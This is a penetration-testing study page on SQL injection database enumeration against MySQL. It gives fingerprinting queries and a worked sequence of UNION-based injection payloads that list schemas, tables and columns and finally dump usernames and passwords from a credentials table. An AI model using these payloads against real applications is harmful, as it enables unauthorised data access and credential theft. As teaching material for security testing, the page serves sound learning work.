---
layout:
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Database Enumeration

Database enumeration is a critical technique used in cybersecurity to extract detailed information about a database's structure and contents. By leveraging SQL queries, particularly in the context of SQL injection vulnerabilities, security professionals and attackers alike can uncover valuable insights, such as the names of databases, tables, and columns. This process not only aids in understanding the database architecture but also highlights potential security weaknesses that could be exploited. Understanding how to effectively perform database enumeration is essential for both securing applications and conducting penetration testing.

**Overview**

* Database Enumeration focuses on gathering data from a database using SQL queries within SQL injection contexts.
* It emphasizes on MySQL fingerprinting and utilizing the INFORMATION\_SCHEMA database for enumeration.

**MySQL Fingerprinting**

* **Purpose**: Identify the type of DBMS to tailor SQL queries accordingly.
* **Initial Guesses**:
  * Apache/Nginx → Likely MySQL (Linux)
  * IIS → Likely MSSQL (Windows)
* **Fingerprinting Queries**:
  * `SELECT @@version`: Returns MySQL version (e.g., `10.3.22-MariaDB-1ubuntu1`).
  * `SELECT POW(1,1)`: Returns `1` for numeric output.
  * `SELECT SLEEP(5)`: Delays response by 5 seconds for blind injections.

**INFORMATION\_SCHEMA Database**

* Contains metadata about databases and tables on the server.
* Essential for exploiting SQL injection vulnerabilities.
* Use the dot operator to reference tables in other databases.

**Enumeration Steps**

1. **List Databases**:
   * Query: `SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;`
   * Output: Lists all databases, ignoring default ones (mysql, information\_schema, performance\_schema).
2. **Identify Current Database**:
   * Query: `SELECT database();`
   * Output: Identifies the active database (e.g., `ilfreight`).
3. **List Tables in a Database**:
   * Query: `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -`
   * Output: Lists tables in the specified database (e.g., `credentials`, `framework`, `pages`, `posts`).
4. **Find Column Names in a Table**:
   * Query: `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -`
   * Output: Identifies columns (e.g., `username`, `password`).
5. **Dump Data from a Table**:
   * Final Query: `cn' UNION select 1, username, password, 4 from dev.credentials-- -`
   * Output: Retrieves sensitive information (e.g., password hashes, API keys).

**Key Takeaways**

* Understanding the structure of the INFORMATION\_SCHEMA is crucial for effective database enumeration.
* Properly formed SQL queries can extract sensitive data through SQL injection vulnerabilities.
* Always use the correct database context when referencing tables and columns.